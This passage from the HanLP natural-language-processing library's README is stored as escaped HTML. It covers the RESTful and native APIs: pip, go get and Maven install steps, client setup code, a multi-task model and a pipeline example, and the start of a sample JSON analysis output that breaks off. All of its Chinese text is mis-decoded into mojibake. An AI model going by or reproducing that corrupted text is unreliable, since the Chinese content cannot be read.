&lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/cor_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;OntoNotes&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ËØ≠‰πâÊñáÊú¨Áõ∏‰ººÂ∫¶&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/sts_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/sts_stl.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/sts.html&#34;&gt;sts&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ÊñáÊú¨È£éÊ†ºËΩ¨Êç¢&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/tst_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/keyphrase_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;ÊäΩÂèñÂºèËá™Âä®ÊëòË¶Å&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/extractive_summarization_restful.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;    &lt;td&gt;ÊöÇÊó†&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;  &lt;/tbody&gt; &#xA; &lt;/table&gt; &#xA;&lt;/div&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ËØçÂπ≤ÊèêÂèñ„ÄÅËØçÊ≥ïËØ≠Ê≥ïÁâπÂæÅÊèêÂèñËØ∑ÂèÇËÄÉ&lt;a href=&#34;https://hanlp.hankcs.com/docs/tutorial.html&#34;&gt;Ëã±ÊñáÊïôÁ®ã&lt;/a&gt;Ôºõ&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/word2vec.html&#34;&gt;ËØçÂêëÈáè&lt;/a&gt;Âíå&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/mlm.html&#34;&gt;ÂÆåÂΩ¢Â°´Á©∫&lt;/a&gt;ËØ∑ÂèÇËÄÉÁõ∏Â∫îÊñáÊ°£„ÄÇ&lt;/li&gt; &#xA; &lt;li&gt;ÁÆÄÁπÅËΩ¨Êç¢„ÄÅÊãºÈü≥„ÄÅÊñ∞ËØçÂèëÁé∞„ÄÅÊñáÊú¨ËÅöÁ±ªËØ∑ÂèÇËÄÉ&lt;a href=&#34;https://github.com/hankcs/HanLP/tree/1.x&#34;&gt;1.xÊïôÁ®ã&lt;/a&gt;„ÄÇ&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Èáè‰ΩìË£ÅË°£ÔºåHanLPÊèê‰æõ&lt;strong&gt;RESTful&lt;/strong&gt;Âíå&lt;strong&gt;native&lt;/strong&gt;‰∏§ÁßçAPIÔºåÂàÜÂà´Èù¢ÂêëËΩªÈáèÁ∫ßÂíåÊµ∑ÈáèÁ∫ß‰∏§ÁßçÂú∫ÊôØ„ÄÇÊó†ËÆ∫‰ΩïÁßçAPI‰ΩïÁßçËØ≠Ë®ÄÔºåHanLPÊé•Âè£Âú®ËØ≠‰πâ‰∏ä‰øùÊåÅ‰∏ÄËá¥ÔºåÂú®‰ª£Á†Å‰∏äÂùöÊåÅÂºÄÊ∫ê„ÄÇ&lt;/p&gt; &#xA;&lt;h3&gt;ËΩªÈáèÁ∫ßRESTful API&lt;/h3&gt; &#xA;&lt;p&gt;‰ªÖÊï∞KBÔºåÈÄÇÂêàÊïèÊç∑ÂºÄÂèë„ÄÅÁßªÂä®APPÁ≠âÂú∫ÊôØ„ÄÇÁÆÄÂçïÊòìÁî®ÔºåÊó†ÈúÄGPUÈÖçÁéØÂ¢ÉÔºåÁßíÈÄüÂÆâË£ÖÔºå&lt;strong&gt;Âº∫ÁÉàÊé®Ëçê&lt;/strong&gt;„ÄÇÊúçÂä°Âô®GPUÁÆóÂäõÊúâÈôêÔºåÂåøÂêçÁî®Êà∑ÈÖçÈ¢ùËæÉÂ∞ëÔºå&lt;a href=&#34;https://bbs.hanlp.com/t/hanlp2-1-restful-api/53&#34;&gt;Âª∫ËÆÆÁî≥ËØ∑&lt;strong&gt;ÂÖçË¥πÂÖ¨Áõä&lt;/strong&gt;APIÁßòÈí•&lt;code&gt;auth&lt;/code&gt;&lt;/a&gt;„ÄÇ&lt;/p&gt; &#xA;&lt;h4&gt;Python&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;pip install hanlp_restful&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;ÂàõÂª∫ÂÆ¢Êà∑Á´ØÔºåÂ°´ÂÖ•ÊúçÂä°Âô®Âú∞ÂùÄÂíåÁßòÈí•Ôºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from hanlp_restful import HanLPClient&#xA;HanLP = HanLPClient(&#39;https://www.hanlp.com/api&#39;, auth=None, language=&#39;zh&#39;) # auth‰∏çÂ°´ÂàôÂåøÂêçÔºåzh‰∏≠ÊñáÔºåmulÂ§öËØ≠Áßç&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Golang&lt;/h4&gt; &#xA;&lt;p&gt;ÂÆâË£Ö &lt;code&gt;go get -u github.com/hankcs/gohanlp@main&lt;/code&gt; ÔºåÂàõÂª∫ÂÆ¢Êà∑Á´ØÔºåÂ°´ÂÖ•ÊúçÂä°Âô®Âú∞ÂùÄÂíåÁßòÈí•Ôºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;HanLP := hanlp.HanLPClient(hanlp.WithAuth(&#34;&#34;),hanlp.WithLanguage(&#34;zh&#34;)) // auth‰∏çÂ°´ÂàôÂåøÂêçÔºåzh‰∏≠ÊñáÔºåmulÂ§öËØ≠Áßç&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Java&lt;/h4&gt; &#xA;&lt;p&gt;Âú®&lt;code&gt;pom.xml&lt;/code&gt;‰∏≠Ê∑ªÂä†‰æùËµñÔºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;dependency&amp;gt;&#xA;    &amp;lt;groupId&amp;gt;com.hankcs.hanlp.restful&amp;lt;/groupId&amp;gt;&#xA;    &amp;lt;artifactId&amp;gt;hanlp-restful&amp;lt;/artifactId&amp;gt;&#xA;    &amp;lt;version&amp;gt;0.0.8&amp;lt;/version&amp;gt;&#xA;&amp;lt;/dependency&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;ÂàõÂª∫ÂÆ¢Êà∑Á´ØÔºåÂ°´ÂÖ•ÊúçÂä°Âô®Âú∞ÂùÄÂíåÁßòÈí•Ôºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;HanLPClient HanLP = new HanLPClient(&#34;https://www.hanlp.com/api&#34;, null, &#34;zh&#34;); // auth‰∏çÂ°´ÂàôÂåøÂêçÔºåzh‰∏≠ÊñáÔºåmulÂ§öËØ≠Áßç&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Âø´ÈÄü‰∏äÊâã&lt;/h4&gt; &#xA;&lt;p&gt;Êó†ËÆ∫‰ΩïÁßçÂºÄÂèëËØ≠Ë®ÄÔºåË∞ÉÁî®&lt;code&gt;parse&lt;/code&gt;Êé•Âè£Ôºå‰º†ÂÖ•‰∏ÄÁØáÊñáÁ´†ÔºåÂæóÂà∞HanLPÁ≤æÂáÜÁöÑÂàÜÊûêÁªìÊûú„ÄÇ&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;HanLP.parse(&#34;2021Âπ¥HanLPv2.1‰∏∫Áîü‰∫ßÁéØÂ¢ÉÂ∏¶Êù•Ê¨°‰∏ñ‰ª£ÊúÄÂÖàËøõÁöÑÂ§öËØ≠ÁßçNLPÊäÄÊúØ„ÄÇÈòøÂ©Ü‰∏ªÊù•Âà∞Âåó‰∫¨Á´ãÊñπÂ∫≠ÂèÇËßÇËá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏„ÄÇ&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Êõ¥Â§öÂäüËÉΩÂåÖÊã¨ËØ≠‰πâÁõ∏‰ººÂ∫¶„ÄÅÈ£éÊ†ºËΩ¨Êç¢„ÄÅÊåá‰ª£Ê∂àËß£Á≠âÔºåËØ∑ÂèÇËÄÉ&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/restful.html&#34;&gt;ÊñáÊ°£&lt;/a&gt;Âíå&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/master/plugins/hanlp_restful/tests/test_client.py&#34;&gt;ÊµãËØïÁî®‰æã&lt;/a&gt;„ÄÇ&lt;/p&gt; &#xA;&lt;h3&gt;Êµ∑ÈáèÁ∫ßnative API&lt;/h3&gt; &#xA;&lt;p&gt;‰æùËµñPyTorch„ÄÅTensorFlowÁ≠âÊ∑±Â∫¶Â≠¶‰π†ÊäÄÊúØÔºåÈÄÇÂêà&lt;strong&gt;‰∏ì‰∏ö&lt;/strong&gt;NLPÂ∑•Á®ãÂ∏à„ÄÅÁ†îÁ©∂ËÄÖ‰ª•ÂèäÊú¨Âú∞Êµ∑ÈáèÊï∞ÊçÆÂú∫ÊôØ„ÄÇË¶ÅÊ±ÇPython 3.6Ëá≥3.9ÔºåÊîØÊåÅWindowsÔºåÊé®Ëçê*nix„ÄÇÂèØ‰ª•Âú®CPU‰∏äËøêË°åÔºåÊé®ËçêGPU/TPU„ÄÇÂÆâË£ÖPyTorchÁâàÔºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install hanlp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;HanLPÊØèÊ¨°ÂèëÂ∏ÉÈÉΩÈÄöËøá‰∫ÜLinux„ÄÅmacOSÂíåWindows‰∏äPython3.6Ëá≥3.9ÁöÑ&lt;a href=&#34;https://github.com/hankcs/HanLP/actions&#34;&gt;ÂçïÂÖÉÊµãËØï&lt;/a&gt;Ôºå‰∏çÂ≠òÂú®ÂÆâË£ÖÈóÆÈ¢ò„ÄÇ&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;HanLPÂèëÂ∏ÉÁöÑÊ®°ÂûãÂàÜ‰∏∫Â§ö‰ªªÂä°ÂíåÂçï‰ªªÂä°‰∏§ÁßçÔºåÂ§ö‰ªªÂä°ÈÄüÂ∫¶Âø´ÁúÅÊòæÂ≠òÔºåÂçï‰ªªÂä°Á≤æÂ∫¶È´òÊõ¥ÁÅµÊ¥ª„ÄÇ&lt;/p&gt; &#xA;&lt;h4&gt;Â§ö‰ªªÂä°Ê®°Âûã&lt;/h4&gt; &#xA;&lt;p&gt;HanLPÁöÑÂ∑•‰ΩúÊµÅÁ®ã‰∏∫Âä†ËΩΩÊ®°ÂûãÁÑ∂ÂêéÂ∞ÜÂÖ∂ÂΩì‰ΩúÂáΩÊï∞Ë∞ÉÁî®Ôºå‰æãÂ¶Ç‰∏ãÂàóËÅîÂêàÂ§ö‰ªªÂä°Ê®°ÂûãÔºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import hanlp&#xA;HanLP = hanlp.load(hanlp.pretrained.mtl.CLOSE_TOK_POS_NER_SRL_DEP_SDP_CON_ELECTRA_SMALL_ZH) # ‰∏ñÁïåÊúÄÂ§ß‰∏≠ÊñáËØ≠ÊñôÂ∫ì&#xA;HanLP([&#39;2021Âπ¥HanLPv2.1‰∏∫Áîü‰∫ßÁéØÂ¢ÉÂ∏¶Êù•Ê¨°‰∏ñ‰ª£ÊúÄÂÖàËøõÁöÑÂ§öËØ≠ÁßçNLPÊäÄÊúØ„ÄÇ&#39;, &#39;ÈòøÂ©Ü‰∏ªÊù•Âà∞Âåó‰∫¨Á´ãÊñπÂ∫≠ÂèÇËßÇËá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏„ÄÇ&#39;])&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Native APIÁöÑËæìÂÖ•Âçï‰Ωç‰∏∫Âè•Â≠êÔºåÈúÄ‰ΩøÁî®&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/master/plugins/hanlp_demo/hanlp_demo/sent_split.py&#34;&gt;Â§öËØ≠ÁßçÂàÜÂè•Ê®°Âûã&lt;/a&gt;Êàñ&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/master/hanlp/utils/rules.py#L19&#34;&gt;Âü∫‰∫éËßÑÂàôÁöÑÂàÜÂè•ÂáΩÊï∞&lt;/a&gt;ÂÖàË°åÂàÜÂè•„ÄÇRESTfulÂíånative‰∏§ÁßçAPIÁöÑËØ≠‰πâËÆæËÆ°ÂÆåÂÖ®‰∏ÄËá¥ÔºåÁî®Êà∑ÂèØ‰ª•Êó†Áºù‰∫íÊç¢„ÄÇÁÆÄÊ¥ÅÁöÑÊé•Âè£‰πüÊîØÊåÅÁÅµÊ¥ªÁöÑÂèÇÊï∞ÔºåÂ∏∏Áî®ÁöÑÊäÄÂ∑ßÊúâÔºö&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ÁÅµÊ¥ªÁöÑ&lt;code&gt;tasks&lt;/code&gt;‰ªªÂä°Ë∞ÉÂ∫¶Ôºå‰ªªÂä°Ë∂äÂ∞ëÔºåÈÄüÂ∫¶Ë∂äÂø´ÔºåËØ¶ËßÅ&lt;a href=&#34;https://mybinder.org/v2/gh/hankcs/HanLP/doc-zh?filepath=plugins%2Fhanlp_demo%2Fhanlp_demo%2Fzh%2Ftutorial.ipynb&#34;&gt;ÊïôÁ®ã&lt;/a&gt;„ÄÇÂú®ÂÜÖÂ≠òÊúâÈôêÁöÑÂú∫ÊôØ‰∏ãÔºåÁî®Êà∑ËøòÂèØ‰ª•&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/master/plugins/hanlp_demo/hanlp_demo/zh/demo_del_tasks.py&#34;&gt;Âà†Èô§‰∏çÈúÄË¶ÅÁöÑ‰ªªÂä°&lt;/a&gt;ËææÂà∞Ê®°ÂûãÁò¶Ë∫´ÁöÑÊïàÊûú„ÄÇ&lt;/li&gt; &#xA; &lt;li&gt;È´òÊïàÁöÑtrieÊ†ëËá™ÂÆö‰πâËØçÂÖ∏Ôºå‰ª•ÂèäÂº∫Âà∂„ÄÅÂêàÂπ∂„ÄÅÊ†°Ê≠£3ÁßçËßÑÂàôÔºåËØ∑ÂèÇËÄÉ&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/doc-zh/plugins/hanlp_demo/hanlp_demo/zh/tok_mtl.ipynb&#34;&gt;demo&lt;/a&gt;Âíå&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/components/tokenizers/transformer.html&#34;&gt;ÊñáÊ°£&lt;/a&gt;„ÄÇËßÑÂàôÁ≥ªÁªüÁöÑÊïàÊûúÂ∞ÜÊó†ÁºùÂ∫îÁî®Âà∞ÂêéÁª≠ÁªüËÆ°Ê®°ÂûãÔºå‰ªéËÄåÂø´ÈÄüÈÄÇÂ∫îÊñ∞È¢ÜÂüü„ÄÇ&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Âçï‰ªªÂä°Ê®°Âûã&lt;/h4&gt; &#xA;&lt;p&gt;Ê†πÊçÆÊàë‰ª¨ÁöÑ&lt;a href=&#34;https://aclanthology.org/2021.emnlp-main.451&#34;&gt;ÊúÄÊñ∞Á†îÁ©∂&lt;/a&gt;ÔºåÂ§ö‰ªªÂä°Â≠¶‰π†ÁöÑ‰ºòÂäøÂú®‰∫éÈÄüÂ∫¶ÂíåÊòæÂ≠òÔºåÁÑ∂ËÄåÁ≤æÂ∫¶ÂæÄÂæÄ‰∏çÂ¶ÇÂçï‰ªªÂä°Ê®°Âûã„ÄÇÊâÄ‰ª•ÔºåHanLPÈ¢ÑËÆ≠ÁªÉ‰∫ÜËÆ∏Â§öÂçï‰ªªÂä°Ê®°ÂûãÂπ∂ËÆæËÆ°‰∫Ü‰ºòÈõÖÁöÑ&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/components/pipeline.html#hanlp.components.pipeline.Pipeline&#34;&gt;ÊµÅÊ∞¥Á∫øÊ®°Âºè&lt;/a&gt;Â∞ÜÂÖ∂ÁªÑË£ÖËµ∑Êù•„ÄÇ&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import hanlp&#xA;HanLP = hanlp.pipeline() \&#xA;    .append(hanlp.utils.rules.split_sentence, output_key=&#39;sentences&#39;) \&#xA;    .append(hanlp.load(&#39;FINE_ELECTRA_SMALL_ZH&#39;), output_key=&#39;tok&#39;) \&#xA;    .append(hanlp.load(&#39;CTB9_POS_ELECTRA_SMALL&#39;), output_key=&#39;pos&#39;) \&#xA;    .append(hanlp.load(&#39;MSRA_NER_ELECTRA_SMALL_ZH&#39;), output_key=&#39;ner&#39;, input_key=&#39;tok&#39;) \&#xA;    .append(hanlp.load(&#39;CTB9_DEP_ELECTRA_SMALL&#39;, conll=0), output_key=&#39;dep&#39;, input_key=&#39;tok&#39;)\&#xA;    .append(hanlp.load(&#39;CTB9_CON_ELECTRA_SMALL&#39;), output_key=&#39;con&#39;, input_key=&#39;tok&#39;)&#xA;HanLP(&#39;2021Âπ¥HanLPv2.1‰∏∫Áîü‰∫ßÁéØÂ¢ÉÂ∏¶Êù•Ê¨°‰∏ñ‰ª£ÊúÄÂÖàËøõÁöÑÂ§öËØ≠ÁßçNLPÊäÄÊúØ„ÄÇÈòøÂ©Ü‰∏ªÊù•Âà∞Âåó‰∫¨Á´ãÊñπÂ∫≠ÂèÇËßÇËá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏„ÄÇ&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Êõ¥Â§öÂäüËÉΩÔºåËØ∑ÂèÇËÄÉ&lt;a href=&#34;https://github.com/hankcs/HanLP/tree/doc-zh/plugins/hanlp_demo/hanlp_demo/zh&#34;&gt;demo&lt;/a&gt;Âíå&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/index.html&#34;&gt;ÊñáÊ°£&lt;/a&gt;‰∫ÜËß£Êõ¥Â§öÊ®°Âûã‰∏éÁî®Ê≥ï„ÄÇ&lt;/p&gt; &#xA;&lt;h3&gt;ËæìÂá∫Ê†ºÂºè&lt;/h3&gt; &#xA;&lt;p&gt;Êó†ËÆ∫‰ΩïÁßçAPI‰ΩïÁßçÂºÄÂèëËØ≠Ë®Ä‰ΩïÁßçËá™ÁÑ∂ËØ≠Ë®ÄÔºåHanLPÁöÑËæìÂá∫Áªü‰∏Ä‰∏∫&lt;code&gt;json&lt;/code&gt;Ê†ºÂºèÂÖºÂÆπ&lt;code&gt;dict&lt;/code&gt;ÁöÑ&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/common/document.html&#34;&gt;&lt;code&gt;Document&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;tok/fine&#34;: [&#xA;    [&#34;2021Âπ¥&#34;, &#34;HanLPv2.1&#34;, &#34;‰∏∫&#34;, &#34;Áîü‰∫ß&#34;, &#34;ÁéØÂ¢É&#34;, &#34;Â∏¶Êù•&#34;, &#34;Ê¨°&#34;, &#34;‰∏ñ‰ª£&#34;, &#34;ÊúÄ&#34;, &#34;ÂÖàËøõ&#34;, &#34;ÁöÑ&#34;, &#34;Â§ö&#34;, &#34;ËØ≠Áßç&#34;, &#34;NLP&#34;, &#34;ÊäÄÊúØ&#34;, &#34;„ÄÇ&#34;],&#xA;    [&#34;ÈòøÂ©Ü‰∏ª&#34;, &#34;Êù•Âà∞&#34;, &#34;Âåó‰∫¨&#34;, &#34;Á´ãÊñπÂ∫≠&#34;, &#34;ÂèÇËßÇ&#34;, &#34;Ëá™ÁÑ∂&#34;, &#34;ËØ≠‰πâ&#34;, &#34;ÁßëÊäÄ&#34;, &#34;ÂÖ¨Âè∏&#34;, &#34;„ÄÇ&#34;]&#xA;  ],&#xA;  &#34;tok/coarse&#34;: [&#xA;    [&#34;2021Âπ¥&#34;, &#34;HanLPv2.1&#34;, &#34;‰∏∫&#34;, &#34;Áîü‰∫ß&#34;, &#34;ÁéØÂ¢É&#34;, &#34;Â∏¶Êù•&#34;, &#34;Ê¨°‰∏ñ‰ª£&#34;, &#34;ÊúÄ&#34;, &#34;ÂÖàËøõ&#34;, &#34;ÁöÑ&#34;, &#34;Â§öËØ≠Áßç&#34;, &#34;NLP&#34;, &#34;ÊäÄÊúØ&#34;, &#34;„ÄÇ&#34;],&#xA;    [&#34;ÈòøÂ©Ü‰∏ª&#34;, &#34;Êù•Âà∞&#34;, &#34;Âåó‰∫¨Á´ãÊñπÂ∫≠&#34;, &#34;ÂèÇËßÇ&#34;, &#34;Ëá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏&#34;, &#34;„ÄÇ&#34;]&#xA;  ],&#xA;  &#34;pos/ctb&#34;: [&#xA;    [&#34;NT&#34;, &#34;NR&#34;, &#34;P&#34;, &#34;NN&#34;, &#34;NN&#34;, &#34;VV&#34;, &#34;JJ&#34;, &#34;NN&#34;, &#34;AD&#34;, &#34;JJ&#34;, &#34;DEG&#34;, &#34;CD&#34;, &#34;NN&#34;, &#34;NR&#34;, &#34;NN&#34;, &#34;PU&#34;],&#xA;    [&#34;NN&#34;, &#34;VV&#34;, &#34;NR&#34;, &#34;NR&#34;, &#34;VV&#34;, &#34;NN&#34;, &#34;NN&#34;, &#34;NN&#34;, &#34;NN&#34;, &#34;PU&#34;]&#xA;  ],&#xA;  &#34;pos/pku&#34;: [&#xA;    [&#34;t&#34;, &#34;nx&#34;, &#34;p&#34;, &#34;vn&#34;, &#34;n&#34;, &#34;v&#34;, &#34;b&#34;, &#34;n&#34;, &#34;d&#34;, &#34;a&#34;, &#34;u&#34;, &#34;a&#34;, &#34;n&#34;, &#34;nx&#34;, &#34;n&#34;, &#34;w&#34;],&#xA;    [&#34;n&#34;, &#34;v&#34;, &#34;ns&#34;, &#34;ns&#34;, &#34;v&#34;, &#34;n&#34;, &#34;n&#34;, &#34;n&#34;, &#34;n&#34;, &#34;w&#34;]&#xA;  ],&#xA;  &#34;pos/863&#34;: [&#xA;    [&#34;nt&#34;, &#34;w&#34;, &#34;p&#34;, &#34;v&#34;, &#34;n&#34;, &#34;v&#34;, &#34;a&#34;, &#34;nt&#34;, &#34;d&#34;, &#34;a&#34;, &#34;u&#34;, &#34;a&#34;, &#34;n&#34;, &#34;ws&#34;, &#34;n&#34;, &#34;w&#34;],&#xA;    [&#34;n&#34;, &#34;v&#34;, &#34;ns&#34;, &#34;n&#34;, &#34;v&#34;, &#34;n&#34;, &#34;n&#34;, &#34;n&#34;, &#34;n&#34;, &#34;w&#34;]&#xA;  ],&#xA;  &#34;ner/pku&#34;: [&#xA;    [],&#xA;    [[&#34;Âåó‰∫¨Á´ãÊñπÂ∫≠&#34;, &#34;ns&#34;, 2, 4], [&#34;Ëá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏&#34;, &#34;nt&#34;, 5, 9]]&#xA;  ],&#xA;  &#34;ner/msra&#34;: [&#xA;    [[&#34;2021Âπ¥&#34;, &#34;DATE&#34;, 0, 1], [&#34;HanLPv2.1&#34;, &#34;ORGANIZATION&#34;, 1, 2]],&#xA;    [[&#34;Âåó‰∫¨&#34;, &#34;LOCATION&#34;, 2, 3], [&#34;Á´ãÊñπÂ∫≠&#34;, &#34;LOCATION&#34;, 3, 4], [&#34;Ëá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏&#34;, &#34;ORGANIZATION&#34;, 5, 9]]&#xA;  ],&#xA;  &#34;ner/ontonotes&#34;: [&#xA;    [[&#34;2021Âπ¥&#34;, &#34;DATE&#34;, 0, 1], [&#34;HanLPv2.1&#34;, &#34;ORG&#34;, 1, 2]],&#xA;    [[&#34;Âåó‰∫¨Á´ãÊñπÂ∫≠&#34;, &#34;FAC&#34;, 2, 4], [&#34;Ëá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏&#34;, &#34;ORG&#34;, 5, 9]]&#xA;  ],&#xA;  &#34;srl&#34;: [&#xA;    [[[&#34;2021Âπ¥&#34;, &#34;ARGM-TMP&#34;, 0, 1], [&#34;HanLPv2.1&#34;, &#34;ARG0&#34;, 1, 2], [&#34;‰∏∫Áîü‰∫ßÁéØÂ¢É&#34;, &#34;ARG2&#34;, 2, 5], [&#34;Â∏¶Êù•&#34;, &#34;PRED&#34;, 5, 6], [&#34;Ê¨°‰∏ñ‰ª£ÊúÄÂÖàËøõÁöÑÂ§öËØ≠ÁßçNLPÊäÄÊúØ&#34;, &#34;ARG1&#34;, 6, 15]], [[&#34;ÊúÄ&#34;, &#34;ARGM-ADV&#34;, 8, 9], [&#34;ÂÖàËøõ&#34;, &#34;PRED&#34;, 9, 10], [&#34;ÊäÄÊúØ&#34;, &#34;ARG0&#34;, 14, 15]]],&#xA;    [[[&#34;ÈòøÂ©Ü‰∏ª&#34;, &#34;ARG0&#34;, 0, 1], [&#34;Êù•Âà∞&#34;, &#34;PRED&#34;, 1, 2], [&#34;Âåó‰∫¨Á´ãÊñπÂ∫≠&#34;, &#34;ARG1&#34;, 2, 4]], [[&#34;ÈòøÂ©Ü‰∏ª&#34;, &#34;ARG0&#34;, 0, 1], [&#34;ÂèÇËßÇ&#34;, &#34;PRED&#34;, 4, 5], [&#34;Ëá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏&#34;, &#34;ARG1&#34;, 5, 9]]]&#xA;  ],&#xA;  &#34;dep&#34;: [&#xA;    [[6, &#34;tmod&#34;], [6, &#34;nsubj&#34;], [6, &#34;prep&#34;], [5, &#34;nn&#34;], [3, &#34;pobj&#34;], [0, &#34;root&#34;], [8, &#34;amod&#34;], [15, &#34;nn&#34;], [10, &#34;advmod&#34;], [15, &#34;rcmod&#34;], [10, &#34;assm&#34;], [13, &#34;nummod&#34;], [15, &#34;nn&#34;], [15, &#34;nn&#34;], [6, &#34;dobj&#34;], [6, &#34;punct&#34;]],&#xA;    [[2, &#34;nsubj&#34;], [0, &#34;root&#34;], [4, &#34;nn&#34;], [2, &#34;dobj&#34;], [2, &#34;conj&#34;], [9, &#34;nn&#34;], [9, &#34;nn&#34;], [9, &#34;nn&#34;], [5, &#34;dobj&#34;], [2, &#34;punct&#34;]]&#xA;  ],&#xA;  &#34;sdp&#34;: [&#xA;    [[[6, &#34;Time&#34;]], [[6, &#34;Exp&#34;]], [[5, &#34;mPrep&#34;]], [[5, &#34;Desc&#34;]], [[6, &#34;Datv&#34;]], [[13, &#34;dDesc&#34;]], [[0, &#34;Root&#34;], [8, &#34;Desc&#34;], [13, &#34;Desc&#34;]], [[15, &#34;Time&#34;]], 